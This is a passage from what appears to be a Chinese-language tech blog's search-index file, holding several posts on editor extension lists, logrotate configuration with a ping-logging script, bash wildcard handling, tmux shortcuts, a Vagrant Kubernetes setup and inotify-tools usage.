imperez.smarty\ncode --install-extension JakeWilson.vscode-cdnjs\ncode --install-extension janjoerke.align-by-regex\ncode --install-extension johnstoncode.svn-scm\ncode --install-extension Kelvin.vscode-sshfs\ncode --install-extension kokororin.vscode-phpfmt\ncode --install-extension liximomo.sftp\ncode --install-extension mhutchie.git-graph\ncode --install-extension michelemelluso.gitignore\ncode --install-extension mikestead.dotenv\ncode --install-extension mkloubert.vscode-remote-workspace\ncode --install-extension ms-azuretools.vscode-docker\ncode --install-extension MS-CEINTL.vscode-language-pack-zh-hant\ncode --install-extension ms-vscode.Go\ncode --install-extension ms-vscode.sublime-keybindings\ncode --install-extension mtxr.sqltools\ncode --install-extension neilbrayfield.php-docblocker\ncode --install-extension octref.vetur\ncode --install-extension PKief.material-icon-theme\ncode --install-extension quicktype.quicktype\ncode --install-extension redhat.vscode-xml\ncode --install-extension ryu1kn.partial-diff\ncode --install-extension sadeghpm.sql-snippets\ncode --install-extension shd101wyy.markdown-preview-enhanced\ncode --install-extension shengchen.vscode-leetcode\ncode --install-extension small.php-ci\ncode --install-extension softwaredotcom.swdc-vscode\ncode --install-extension streetsidesoftware.code-spell-checker\ncode --install-extension teamchilla.blueprint\ncode --install-extension Tobermory.es6-string-html\ncode --install-extension tomoki1207.pdf\ncode --install-extension wwm.better-align\ncode --install-extension Yukai.vscode-ptt\ncode --install-extension zhuangtongfa.material-theme\n\n\n#### 家裡\n\ncode --install-extension alefragnani.project-manager\ncode --install-extension bierner.emojisense\ncode --install-extension bierner.markdown-checkbox\ncode --install-extension bierner.markdown-emoji\ncode --install-extension bierner.markdown-footnotes\ncode --install-extension bierner.markdown-image-size\ncode --install-extension bierner.markdown-preview-github-styles\ncode --install-extension christian-kohler.path-intellisense\ncode --install-extension codingyu.laravel-goto-view\ncode --install-extension donjayamanne.githistory\ncode --install-extension eamodio.gitlens\ncode --install-extension esbenp.prettier-vscode\ncode --install-extension felixfbecker.php-intellisense\ncode --install-extension giladgray.theme-blueprint\ncode --install-extension Gruntfuggly.todo-tree\ncode --install-extension HackMD.vscode-hackmd\ncode --install-extension humao.rest-client\ncode --install-extension JakeWilson.vscode-cdnjs\ncode --install-extension jkjustjoshing.vscode-text-pastry\ncode --install-extension Kelvin.vscode-sshfs\ncode --install-extension kokororin.vscode-phpfmt\ncode --install-extension lannonbr.vscode-js-annotations\ncode --install-extension lukazakrajsek.scss-refactoring\ncode --install-extension MehediDracula.php-namespace-resolver\ncode --install-extension michelemelluso.gitignore\ncode --install-extension mikestead.dotenv\ncode --install-extension mitchdenny.ecdc\ncode --install-extension mrmlnc.vscode-scss\ncode --install-extension MS-CEINTL.vscode-language-pack-zh-hant\ncode --install-extension ms-vscode.Go\ncode --install-extension ms-vscode.sublime-keybindings\ncode --install-extension negokaz.live-server-preview\ncode --install-extension octref.vetur\ncode --install-extension oderwat.indent-rainbow\ncode --install-extension onecentlin.laravel-blade\ncode --install-extension pranaygp.vscode-css-peek\ncode --install-extension renesackers.angelscript\ncode --install-extension ritwickdey.live-sass\ncode --install-extension ritwickdey.LiveServer\ncode --install-extension robinbentley.sass-indented\ncode --install-extension shyykoserhiy.git-autoconfig\ncode --install-extension small.php-ci\ncode --install-extension streetsidesoftware.code-spell-checker\ncode --install-extension Tobermory.es6-string-html\ncode --install-extension vector-of-bool.gitflow\ncode --install-extension vscode-icons-team.vscode-icons\ncode --install-extension yuichinukiyama.vscode-preview-server\ncode --install-extension zhangciwu.swig-tpl\n\n### Sublime\n\n#### 家裡\n\n 0_package_control_loader.sublime-package\n AdvancedNewFile.sublime-package\n Alignment.sublime-package\n'All Autocomplete.sublime-package'\n'Bootstrap 3 Snippets.sublime-package'\n BracketHighlighter.sublime-package\n'CodeIgniter Snippets.sublime-package'\n'CodeIgniter Utilities.sublime-package'\n DocBlockr.sublime-package\n Emmet.sublime-package\n FakeDataGenerator.sublime-package\n GhostText.sublime-package\n Goto-CSS-Declaration.sublime-package\n jQuery.sublime-package\n'Package Control.sublime-package'\n'PHP Getters and Setters.sublime-package'\n'Pretty JSON.sublime-package'\n PyV8/\n Sass.sublime-package\n SqlBeautifier.sublime-package\n StringEncode.sublime-package\n'Text Pastry.sublime-package'\n'Vuejs Snippets.sublime-package'\n\n\n#### 公司\n\n'Pretty JSON'/\nSFTP/\n'0Sublimerge 3'/\n'Theme - Default'/\nUser/","tags":["sublime"],"categories":["實用工具"]},{"title":"logrotate 自動切割 log 小記","url":"%2Fblog%2F2020%2F01%2F27%2Flogrotate-%E8%87%AA%E5%8B%95%E5%88%87%E5%89%B2-log-%E5%B0%8F%E8%A8%98%2F","content":"\n最近 Pi 2號機有時候 ssh 不穩\n重開數據機或重插網路線就恢復正常\n不知道是哪邊問題\n想寫 ping log 來排除一些狀況\n\n<!--more-->\n\n## ping shell\n\n首先，我需要準備 ping 的 shell 程式\n\n```bash\n#!/bin/bash\n\nIP=$1\n\ndate \"+%Y-%m-%d %H:%M:%S\"\necho \"PING HOST ${IP}\"\n\nwhile [ TRUE ]\ndo\n        ping -c 10 ${IP}\n        sleep 300 #300秒檢查\ndone\n```\n\n開啟 tmux 分割多個視窗\n`./test.sh > ping_tw.yahoo.com.log`\n\n更多 ping 相關指令\n[Ping 指令用法教學：檢查網路連線狀態與品質 - G. T. Wang](https://blog.gtwang.org/linux/windows-linux-ping-command-tutorial/) {% asset_link ping.png 備份圖 %}\n\n### 沒辦法中斷(Ctrl + C) 程式\n\n[你无法用ctrl c 杀死的进程 - 简书](https://www.jianshu.com/p/a028c9eef2c2)\n\n簡單解決方法，用 htop kill掉程式吧...\n\n### shell 比較要注意加\"\n\n> 有兩種解決方法：\n> if [ \"$app-running\" == \"\" ];\n> 或是\n> if [[ $app-running == \"\" ]];\n\n[Linux 的 shell script 中，遇到 unary operator expected 的解決方法](https://medium.com/micheh/linux-%E7%9A%84-shell-script-%E4%B8%AD-%E9%81%87%E5%88%B0-unary-operator-expected-%E7%9A%84%E8%A7%A3%E6%B1%BA%E6%96%B9%E6%B3%95-3b4725d3fdf1)\n\n### shell error print\n\n[Writing shell scripts - Lesson 14: Errors and Signals and Traps (Oh My!) - Part 1](http://linuxcommand.org/lc3_wss0140.php)\n\n\n## logrotate\n\n\n### 更換 log 方法\n\n其實 logrotate 切割 log 我有在想不會跟線上執行程式衝到嗎?\n[Linux 日志切割神器 logrotate 原理介绍和配置详解 | HelloDog](https://wsgzao.github.io/post/logrotate/) {% asset_link web1.png 備份圖 %}\n這邊裡面有詳細說明\n\n> 如上也就是 logrotate 的默認操作方式，也就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支持重新打開日誌文件，如 syslog, nginx, mysql 等，那麼這是最好的方式。\n> 不過，有些程序並不支持這種方式，壓根沒有提供重新打開日誌的接口；而如果重啟應用程序，必然會降低可用性，為此引入了如下方式。\n\n這邊讓我想到之前有做，mv 跟 cp 實驗([cp 複製檔案可能沒注意的事情 | 程式狂想筆記](https://malagege.github.io/blog/2020/01/10/cp-%E8%A4%87%E8%A3%BD%E6%AA%94%E6%A1%88%E5%8F%AF%E8%83%BD%E6%B2%92%E6%B3%A8%E6%84%8F%E7%9A%84%E4%BA%8B%E6%83%85/))\n\n我計畫使用 `./test.sh > ping_tw.yahoo.com.log`\n但這個好像不可行 我是使用指令倒出 log\n\n### 輸出問題\n\n我想預防上述的問題\n我想到下面方法\n**不過先說明以下 shell 不能正常執行**\n**不過先說明以下 shell 不能正常執行**\n**不過先說明以下 shell 不能正常執行**\n```bash\n#!/bin/bash\n\nIP=$1\nif [ \"${IP}\" = \"\" ];then\n    echo \"must need put IP\" 1>&2\n    exit 1\nfi\n\nOUTLOG=\" >> ping_${IP}.log\"\n\n\nwhile [ TRUE ]\ndo\n        echo \"=========================================\" $OUTLOG\n        echo \"=========================================\" $OUTLOG\n        date \"+%Y-%m-%d %H:%M:%S\" $OUTLOG\n        echo \"PING HOST: ${IP}\" $OUTLOG\n\n        ping -c 10 ${IP}  $OUTLOG\n        sleep 300 #300秒檢查\ndone\n\n```\n\n\n```shell\nlog() {\n  if [ -n \"$logfile\" ]; then\n    printf '%s\\n' \"$@\" >> \"$logfile\"\n  else\n    printf '%s\\n' \"$@\"\n  fi\n}\n\nlog \"$buf\"\n```\n\n可修正成這個方法[shell script - Elegant solution to echo to either stdout or file in bash - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/336224/elegant-solution-to-echo-to-either-stdout-or-file-in-bash)\n\n因為~~我比較懶~~行數比較少，所以我就寫在每一行 XD\n但其實可以不用這樣寫\n可參考後續文章\n```bash\n#!/bin/bash\n\nIP=$1\nif [ \"${IP}\" = \"\" ];then\n    echo \"must need put IP\" 1>&2\n    exit 1\nfi\n\nOUTLOG=\" >> ping_${IP}.log\"\n\nwhile [ TRUE ]\ndo\n        echo \"=========================================\"  >> ping_${IP}.log\n        echo \"=========================================\"  >> ping_${IP}.log\n        date \"+%Y-%m-%d %H:%M:%S\"  >> ping_${IP}.log\n        echo \"PING HOST: ${IP}\"  >> ping_${IP}.log\n\n        ping -c 10 ${IP}   >> ping_${IP}.log\n        sleep 300 #300秒檢查\ndone\n\n```\n\n這樣我應該就能使用 CREATE 機制\n終於到我們重頭戲了\n\n\n## logrotate \n\n###  相關教學網站\n\n* [[CENTOS7] 使用 logrotate 來整理wildfly日誌檔 @新精讚](http://n.sfs.tw/content/index/12926)\n* [Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog](https://wsgzao.github.io/post/logrotate/)\n* [使用 logrotate 定期整理 Rails Log 檔案 – ihower { blogging }](https://ihower.tw/blog/archives/3565)\n* [linux 日志定时轮询流程详解 - 簡書](https://www.jianshu.com/p/ea7c2363639c)\n* [linux - How to insert a date inside the filename with logrotate - Stack Overflow](https://stackoverflow.com/questions/9555769/how-to-insert-a-date-inside-the-filename-with-logrotate)\n* [linux 日志管理服务 logrotate | hatlonely的小站](http://www.hatlonely.com/2018/04/16/linux-%E6%97%A5%E5%BF%97%E7%AE%A1%E7%90%86%E6%9C%8D%E5%8A%A1-logrotate/index.html)\n* [linux - logrotate configuration file syntax - multiple wildcard entries possible? - Super User](https://superuser.com/questions/255951/logrotate-configuration-file-syntax-multiple-wildcard-entries-possible)\n\n### logrotate 重點小記\n\n相關自訂 logrotate 設定可放在 `/etc/logrotate.d`\n原理可看[Linux 日誌切割神器 logrotate 原理介紹和配置詳解 | HelloDog](https://wsgzao.github.io/post/logrotate/) 運行機制\n\n其實最原始的 conf設定在 `/etc/logrotate.conf`\n看到`include /etc/logrotate.d`就能明白為什麼會自動載入\n\n其他看到的重點\n>    配置文件裡一定要配置 rotate 文件數目 這個參數。如果不配置默認是 0 個，也就是只允許存在一份日誌，剛切分出來的日誌會馬上被刪除。多麼痛的領悟，說多了都是淚。\n>    執行 logrotate 命令最好加 -f 參數，不然有時候配置文件修改的內容不生效。\n\n\n\n## 我的 ping 程式設定\n\n/home/pi/ping/ping_*.log {\n  daily\n  dateext\n  missingok\n  rotate 30\n  notifempty\n  create 664 pi pi\n}\n\n\n\n## 訊號問題\n\n看到有些需要做 HUP 動作，讓程式重新讀 log 方法\n使用**create**需要注意通知程式做，copytruncate 不需要做\n\n> create\n> \n> create 是默認的方案，可以通過 create 命令配置文件的權限和屬組設置。\n> \n> 這個方案的思路是：** 重命名原日誌文件，創建新的日誌文件 **。\n> \n> 詳細步驟如下：\n> \n>     1. 重命名正在輸出的日誌文件。 因為重命名只修改文件（目錄亦文件）的名稱，而進程操作文件使用的是 inode，所以並不影響原程序繼續輸出日誌。\n> \n>     2. 創建新的日誌文件。 文件名和原日誌文件一樣，注意，此時只是文件名稱一樣，而 inode 編號不同，程序輸出的日誌還是往原日誌文件輸出。\n> \n>     3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。\n> \n> 簡而言之，logrotate 的默認操作方式，就是 mv+create 執行完之後，通知應用重新在新文件寫入即可。mv+create 成本都比較低，幾乎是原子操作，如果應用支> 持重新打開日誌文件，如 syslog、 nginx、mysql 等，那麼這是最好的方式。\n> \n> 不過，有些程序並不支持這種方式，壓根兒沒有提供重新打開日誌的接口，而如果重啟應用程序，必然會降低可用性，為此引入了 copytruncate 方式。\n> copytruncate\n> \n> copytruncate 是把正在輸出的日誌拷（copy）一份出來，再清空 （trucate）原來的日誌。\n> \n> 詳細步驟如下：\n> \n>     1. 將當前正在輸出的日誌文件複製為目標文件，此時程序仍然將日誌輸出到原來文件中，原文件名也沒有變。\n>     2. 清空原日誌文件，程序仍然還是輸出到原日誌文件中，因為清空文件只把文件的內容刪除了，而 inode 並沒改變。\n> \n> 所以 copytruncate 也就是先複製一份文件，然後清空原有文件。\n> \n> 通常來說，清空操作比較快，但是如果日誌文件太大，那麼複製就會比較耗時，從而可能導致部分日誌丟失。不過這種方式不需要應用程序的支持即可使用。\n\n參考：[Linux 日志切割工具 Logrotate | PwD](https://www.pwdpwd.com/post/2020-01-03-linux-logrotate/)\n\n[linux 日志定时轮询流程详解(logrotate) - 生活费 - 博客园](https://www.cnblogs.com/276815076/p/7053640.html)\n[kill -HUP 命令的使用-赤练挚爱-51CTO博客](https://blog.51cto.com/pengjc/1774210)\n\n\n### 意外小實驗結果\n\n雖然不是很清楚他的原理，但我剛剛做一個實驗\n得出很有趣的結果\n\n> 如果是用 > 重定向輸出的日誌，如 test_app > stdout.log, copytruncate 則無法裁剪原始日誌文件 stdout.log, 它將持續增漲下去。而用 >> 就沒問題了，test-app >> stdout.log，日誌滾動後 stdout.log 大小將變為零。\n\n[Linux 下配置滚动日志之 logrotate | 隔叶黄莺 Yanbin Blog - 软件编程实践](https://yanbin.blog/linux-config-log-ratation-logrotate/)\n\n這邊把  ping.sh 標準輸出註解掉了\n\n```bash\n#!/bin/bash\n\nIP=$1\nif [ \"${IP}\" = \"\" ];then\n    echo \"must need put IP\" 1>&2\n    exit 1\nfi\n\nOUTLOG=\" >> ping_${IP}.log\"\n\nwhile [ TRUE ]\ndo\n        echo \"=========================================\"  #>> ping_${IP}.log\n        echo \"=========================================\"  #>> ping_${IP}.log\n        date \"+%Y-%m-%d %H:%M:%S\"  #>> ping_${IP}.log\n        echo \"PING HOST: ${IP}\"  #>> ping_${IP}.log\n\n\n        ping -c 10 ${IP}   #>> ping_${IP}.log\n        #sleep 300 #300秒檢查\ndone\n```\n\n### 使用 create 做 ./ping.sh 127.0.0.1 >> ping_127.0.0.1.log \n\n做 logrotate(`sudo logrotate -vf /etc/logrotate.d/ping`) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27\n程式持續跑的log會加在ping_127.0.0.1.log-2020-01-27\n如果還記得流程的話，上面有說要 HUP 通知信號跟程式講重抓 log 寫入設定檔\n\n```\n 3. 最後通過某些方式通知程序，重新打開日誌文件。 由於重新打開日誌文件會用到文件路徑而非 inode 編號，所以打開的是新的日誌文件。\n```\n\n{% asset_img 1.png 實驗成果 %}\n\n### 使用 copytruncate 做 ./ping.sh 127.0.0.1 >> ping_127.0.0.1.log \n\n做 logrotate(`sudo logrotate -vf /etc/logrotate.d/ping`) 後會產生ping_127.0.0.1.log,ping_127.0.0.1.log-2020-01-27\n程式持續跑的log會加在ping_127.0.0.1.log\n但聽說這種作法有機率遺失 log\n\n{% asset_img 2.png 實驗成果 %}\n\n## >\n\n這個應該沒什麼機會用到\n但對 create , copytruncate 都會造成 log  紀錄有問題\n結果我就不貼了\n\n## 測試使用\n\n建議加 sudo root執行\n\n1. sudo logrotate /etc/logrotate.d/ping\n執行 logrotate\n\n2. sudo logrotate -d /etc/logrotate.d/ping\n測試日誌切割 (如果文件的時間小於一天，不會執行切割日誌 )\n\n3. sudo logrotate -vf /etc/logrotate.d/ping\n強制輪詢切割日誌 ( 為了便於我們直觀的觀察測試結果,建議大家手動試一下 )\n-f (--force), 就是把不管日誌文件大小是否符合要求，強制執行日誌滾動操作\n\n參照:[linux环境下使用logrotate工具实现nginx日志切割 - 知乎](https://zhuanlan.zhihu.com/p/24880144)\n\n\n### 測試完建議刪除檔案\n\n測試完建議刪除檔案，否則會出現如下錯誤\nerror: destination /home/pi/ping/ping_127.0.0.1.log-20200127 already exists, skipping rotation\n\n[linux - logrotate suffix: dateext + rotate - Stack Overflow](https://stackoverflow.com/questions/25845752/logrotate-suffix-dateext-rotate)\n\n最後 shell 用 tmux 爽爽執行 ping.sh 程式\n\n### logrotate \n\n配置選項\n\n常用選項：\n\n    daily - 指定轉儲週期為每天\n    weekly - 指定轉儲週期為每週\n    monthly - 指定轉儲週期為每月\n    rotate count - 指定日誌文件刪除之前轉儲的次數，0 指沒有備份，5 指保留 5 個備份\n    tabooext [+] list - 讓 logrotate 不轉儲指定擴展名的文件，缺省的擴展名是：.rpm-orig、.rpmsave、v 和 ～\n    missingok - 在日誌輪循期間，任何錯誤將被忽略，例如 * 文件無法找到 * 之類的錯誤\n    size size - 當日誌文件到達指定的大小時才轉儲，bytes (缺省) 及 KB (sizek) 或 MB (sizem)\n    compress - 通過 gzip 壓縮轉儲以後的日誌\n    nocompress - 不壓縮\n    copytruncate - 用於還在打開中的日誌文件，把當前日誌備份並截斷\n    nocopytruncate - 備份日誌文件但是不截斷\n    create mode owner group - 轉儲文件，使用指定的文件模式創建新的日誌文件\n    nocreate - 不建立新的日誌文件\n    delaycompress - 和 compress 一起使用時，轉儲的日誌文件到下一次轉儲時才壓縮\n    nodelaycompress - 覆蓋 delaycompress 選項，轉儲同時壓縮。\n    errors address - 轉儲時的錯誤信息發送到指定的 Email 地址\n    ifempty - 即使是空文件也轉儲，這是 logrotate 的缺省選項。\n    notifempty - 如果是空文件的話，不轉儲\n    mail address - 把轉儲的日誌文件發送到指定的 E-mail 地址\n    nomail - 轉儲時不發送日誌文件\n    olddir directory - 儲後的日誌文件放入指定的目錄，必須和當前日誌文件在同一個文件系統\n    noolddir - 轉儲後的日誌文件和當前日誌文件放在同一個目錄下\n    prerotate/endscript - 在轉儲以前需要執行的命令可以放入這個選項對之間，這兩個關鍵字必須單獨成行\n    sharedscripts - 默認情況下，prerotate/endscript 內定義的命令會對匹配到的所有文件 (比如： /var/log/news/*）都執行一次，如果指定為 sharedscripts，則這些命令只會執行一次\n    dateext - 對於轉儲的日誌文件加上日期後綴\n\n參考:[Linux 日誌切割工具 Logrotate | PwD](https://www.pwdpwd.com/post/2020-01-03-linux-logrotate/) {% asset_link web2.png 備份圖 %}\n\n\n## 總結\n\n其實這篇不重要刪減，所以看的內容非常雜\n不過經過這次實驗有清楚了解到要怎麼使用 logrotate\n\n後續如果程式要做 HUP 訊號要怎麼處理?之後有空在研究","tags":["log"],"categories":["Linux"]},{"title":"linux bash / shell 有關 * 星號的事情","url":"%2Fblog%2F2020%2F01%2F21%2Flinux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85%2F","content":"\n以前 `ls` 萬用字元真的很方便\n\n```\nls *.jpg\n```\n\n這樣可以列出很多 `*.jpg` 圖片\n但是有些細節沒有釐清\n偶爾會遇到不能用的狀況下\n今天終於徹底了解\n\n<!--more-->\n\n## 釐清 `*`\n\n```bash\necho *\n# file list...(ex: xxx.jpg ffff.jpg)\n```\n\n**就是現在目錄抓到相關檔案名稱**\n這也是為什麼? 原理就這麼簡單\n但我這邊沒講更細\n下面 shopt -s nullglob 會提到\n\n## shell array 應用\n\n\n```bash\njpgs=(*.jpg)\n```\n\n這樣看似可以用\n但沒有 jpg ，就會產生 *.jpg\n這邊要小心\n這邊也是有辦法解決\n\n```bash\nshopt -s nullglob # bash\nunsetopt nomatch # zsh\n\n\nfiles=(xorg-x11-fonts*)\n\nif [ -e \"${files[0]}\" ];\nthen\n    printf \"BLAH\"\nfi\n```\n參考:[sh - Check if a file exists with wildcard in shell script - Stack Overflow](https://stackoverflow.com/questions/6363441/check-if-a-file-exists-with-wildcard-in-shell-script/17404812#17404812)\n\n### shopt -s nullglob\n\n```bash\nshopt -s nullglob # enable \nshopt -u nullglob # disable\n```\n\n\n```bash\necho my*file\nmy*file\nshopt -s nullglob\necho my*file # 不會印出東西\n```\n參考: [linux:以下shell選項的含義是什麼 - shopt -s nullglob \\ textglob - Codebug](https://t.codebug.vip/questions-844092.htm)\n\n```bash\n#!/bin/sh  \nold=$(pwd)  \n[ $# -lt 2 ] && echo -e \"\\t[Info] Give arg1=Folder path; arg2=File extension!\\n\" && exit 1  \n[ -d $1 ] && cd $1 || exit 2  \n    \nshopt -s nullglob  \nfound=0  \nfor i in *.$2; do  \n    echo \"File $i found\" # or take other action  \n    found=1  \ndone  \nshopt -u nullglob  \n[ $found -eq 0 ] && echo \"Directory is empty\"  \ncd $old  \n```\n\n// List all file with extension .mp3 under folder 'empty'\n./listFE.sh empty mp3\nFile test.mp3 found\n\n以上參考:[程式扎記: [Linux 文章收集] Use BASH nullglob To Verify *.c Files Exists or Not In a Directory](http://puremonkey2010.blogspot.com/2016/01/linux-use-bash-nullglob-to-verify-c.html)\n\n\n當然也有別的解決方案\n\n## test -f *.jpg\n\n我公司有古早程式這樣寫\n但會遇到一些問題\n\n除了上述解決方法\n\n還有一種是\n\n```bash\nfiles=$(ls /tmp/*.cache 2> /dev/null | wc -l)\nif [ \"$files\" != \"0\" ]\nthen\n    echo \"Cache files exist: do something with them\"\nelse\n    echo \"No cache files...\"\nfi\n```\n\n## find 方法(多層搜尋方法)\n\n```bash\nfiles=$(find /tmp -type f -name \"*.cache\" | wc -l)\n\nif [ \"$files\" != \"0\" ]\nthen\n    echo \"Cache files exist: do something with them\"\nelse\n    echo \"No cache files...\"\nfi\n```\n\nfind 搜尋也可以加 or 條件\n再多個搜尋也是很方便\n```\nfind /tmp -type f -name \"*.mpg\" -o -name \"*.jpg\"\n```\n\n更多方法可以看:[Bash tips: if -e wildcard file check => \\[: too many arguments - MDLog:/sysadmin](http://www.ducea.com/2009/03/05/bash-tips-if-e-wildcard-file-check-too-many-arguments/)\n\n\n相關連結:\n\n* [bash - Use asterisk in variables - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/378205/use-asterisk-in-variables)\n* [sh - Check if a file exists with wildcard in shell script - Stack Overflow](https://stackoverflow.com/questions/6363441/check-if-a-file-exists-with-wildcard-in-shell-script/17404812#17404812)\n* [How to Check / Test if a File or Directory Exists in Bash](https://phoenixnap.com/kb/how-to-check-if-file-or-directory-exists-bash-shell)\n* [Bash tips: if -e wildcard file check => \\[: too many arguments - MDLog:/sysadmin](http://www.ducea.com/2009/03/05/bash-tips-if-e-wildcard-file-check-too-many-arguments/)\n* [電腦各種符號英文唸法 | 阿維雜記本 (Wei's Blog)](https://blog.hsdn.net/970.html)\n* [linux - bash, detecting mp4 files - Stack Overflow](https://stackoverflow.com/questions/25224324/bash-detecting-mp4-files)\n* [关于bash：确认是否存在一个或多个目录 | 码农家园](https://www.codenong.com/10653300/)","tags":["shell"],"categories":["Linux"]},{"title":"tmux 控制終端機好工具","url":"%2Fblog%2F2020%2F01%2F13%2Ftmux-%E6%8E%A7%E5%88%B6%E7%B5%82%E7%AB%AF%E6%A9%9F%E5%A5%BD%E5%B7%A5%E5%85%B7%2F","content":"\n之前就想記錄 tmux 跟 screen\n但這兩個不熟\n久而久之沒用，之前指令就忘記一大辦\n最近又稍微用了一下 tmux\n才突然想到之前就想紀錄 tmux\n\n\n<!--more-->\n\n\n```bash\ntmux \ntmux a -t _number_\ntmux at\ntmux kill-server\n```\n\ntmux 裡面可以操作指令\n\n```\n# 先按 Ctrl + b 再 d\nCtrl+ b 和 d\nCtrl+ b 和 c\nCtrl+ b 和 w\nCtrl+ b 和 n\nCtrl+ b 和 p\nCtrl+ b 和 %\nCtrl+ b 和 /\nCtrl+ b 和 \"\nCtrl+ b 和 _方向鍵_\nCtrl+ b 和 Ctrl+_方向鍵_\n```\n\n[Tech黑手 - 工作雜記: TMUX (Terminal MUltipleXer )](http://chunchaichang.blogspot.com/2014/01/tmux-terminal-multiplexer.html)\n[終端機 session 管理神器 — tmux - Larry・Blog](https://larrylu.blog/tmux-33a24e595fbc)\n[tmux 快速入門筆記 | DEVLOG of andyyou](https://andyyou.github.io/2017/11/27/tmux-notes/)\n\n","tags":["tmux"],"categories":["Linux"]},{"title":"Kubernetes 雜記","url":"%2Fblog%2F2020%2F01%2F12%2FKubernetes-%E9%9B%9C%E8%A8%98%2F","content":"\n尚未整理完成\n\n<!--more-->\n\n\n\n## Vagrant+Virtailbox 架設環境\n\n安裝\n- Vagrant\n- Virtalbox\n\ngit clone [pires/kubernetes-vagrant-coreos-cluster: Kubernetes cluster (for testing purposes) made easy with Vagrant and CoreOS.](https://github.com/pires/kubernetes-vagrant-coreos-cluster)\n\n上面會遇到如下問題\n```\nWARNING: Vagrant has detected the `vagrant-triggers` plugin. This plugin conflicts\nwith the internal triggers implementation. Please uninstall the `vagrant-triggers`\nplugin and run the command again if you wish to use the core trigger feature. To\nuninstall the plugin, run the command shown below:\n\n  vagrant plugin uninstall vagrant-triggers\n\nNote that the community plugin `vagrant-triggers` and the core trigger feature\nin Vagrant do not have compatible syntax.\n\nTo disable this warning, set the environment variable `VAGRANT_USE_VAGRANT_TRIGGERS`.\nInstalled Version: 2.2.4\nLatest Version: 2.2.6\n```\n但好像不用理這個\n\n\n[ecomm-integration-ballerina/kubernetes-cluster: Kubernetes cluster using Vagrant, VirtualBox and Kubeadm](https://github.com/ecomm-integration-ballerina/kubernetes-cluster)\n[Multi Node Kubernetes Cluster with Vagrant, VirtualBox and Kubeadm](https://medium.com/@raj10x/multi-node-kubernetes-cluster-with-vagrant-virtualbox-and-kubeadm-9d3eaac28b98)\n\n別的也有這個[kubernetes-vagrant-centos-cluster/README-cn.md at master · rootsongjc/kubernetes-vagrant-centos-cluster](https://github.com/rootsongjc/kubernetes-vagrant-centos-cluster/blob/master/README-cn.md)\n\nvagrant up \n\n會遇到錯誤\n```\n...\n==> master: Running triggers before up...\n==> master: 2020-01-14 22:11:00 +0800: setting up Kubernetes master...\n==> master: Setting Kubernetes version 1.10.9\n==> master: Box 'coreos-alpha' could not be found. Attempting to find and install...\n    master: Box Provider: virtualbox\n    master: Box Version: = 2345.0.0\n==> master: Loading metadata for box 'http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json'\n    master: URL: http://alpha.release.core-os.net/amd64-usr/current/coreos_production_vagrant.json\n==> master: Adding box 'coreos-alpha' (v2345.0.0) for provider: virtualbox\n    master: Downloading: https://alpha.release.core-os.net/amd64-usr/2345.0.0/coreos_production_vagrant.box\n    master: Calculating and comparing box checksum...\n==> master: Successfully added box 'coreos-alpha' (v2345.0.0) for 'virtualbox'!\n==> master: Importing base box 'coreos-alpha'...\n==> master: Matching MAC address for NAT networking...\n==> master: Checking if box 'coreos-alpha' version '2345.0.0' is up to date...\n==> master: Setting the name of the VM: kubernetes-vagrant-coreos-cluster_master_1579011179473_57219\nIt appears your machine doesn't support NFS, or there is not an\nadapter to enable NFS on this machine for Vagrant. Please verify\nthat `nfsd` is installed on your machine, and try again. If you're\non Windows, NFS isn't supported. If the problem persists, please\ncontact Vagrant support.\n```\n\n解決方是\n\n```\n sudo apt-get install nfs-common nfs-kernel-server\n```\n\n[Simplified install with vagrant_xuxiao1991101的博客-CSDN博客](https://blog.csdn.net/xuxiao1991101/article/details/50563329)\n\n\n\n\n\n\n##","tags":["k8s"],"categories":["Kubernetes"]},{"title":"inotify-tools 監聽資料夾裡檔案異動工具","url":"%2Fblog%2F2020%2F01%2F12%2Finotify-tools-%E7%9B%A3%E8%81%BD%E8%B3%87%E6%96%99%E5%A4%BE%E8%A3%A1%E6%AA%94%E6%A1%88%E7%95%B0%E5%8B%95%E5%B7%A5%E5%85%B7%2F","content":"\n最近做到大檔案處理方式\n由於資料太多，程式在掃整個檔案目錄就花費很多時間\n在想有什麼工具可以監聽資料夾這個動作\n後來有找到 inotify-tools 可以做到\n這邊就小記\n\n<!--more-->\n\n## 安裝\n\n```\n sudo apt install inotify-tools \n```\n\n## Linux 指令\n\n監聽 /home 資料夾目錄(文件的訪問，寫入，修改，刪除)\n\n### inotifywait\n\n```\ninotifywait -rm /home\n```\nnote:\n-r 遞迴目錄都會接收到監聽\n-m 收到監聽異動會持續監聽，不會停止\n\nls 資料夾也會收到訊息\n\n### inotifywatch \n\n```\ninotifywatch -v -e access -e modify -t 60 -r /home\n```\n\n> Establishing watches...\n> Setting up watch(es) on /home\n> OK, /home is now being watched.\n> Total of 5 watches.\n> Finished establishing watches, now collecting statistics.\n> Will listen for events for 30 seconds.\n> total  access  modify  filename\n> 13     3       10      /home/vagrant/\n\n\n監聽access（文件讀取)、modify(文件更改)檔案做統計個數\n\nNOTE:\n-v 顯示訊息\n-e 要監聽的事件\n-t 監聽幾秒鐘\n-r 遞迴目錄都會接收到監聽\n\n### 相關指令設定\n> inotifywait\n> 語法：\n> inotifywait [-hcmrq] [-e ] [-t ] [–format ] [–timefmt ] [ … ]\n> 參數：\n> -h,–help\n> 輸出幫助信息\n> @\n> 排除不需要監視的文件，可以是相對路徑，也可以是絕對路徑。\n> –fromfile\n> 從文件讀取需要監視的文件或排除的文件，一個文件一行，排除的文件以@開頭。\n> -m, –monitor\n> 接收到一個事情而不退出，無限期地執行。默認的行為是接收到一個事情後立即退出。\n> -d, –daemon\n> 跟–monitor一樣，除了是在後台運行，需要指定–outfile把事情輸出到一個文件。也意味著使用了–syslog。\n> -o, –outfile\n> 輸出事情到一個文件而不是標準輸出。\n> -s, –syslog\n> 輸出錯誤信息到系統日誌\n> -r, –recursive\n> 監視一個目錄下的所有子目錄。\n> -q, –quiet\n> 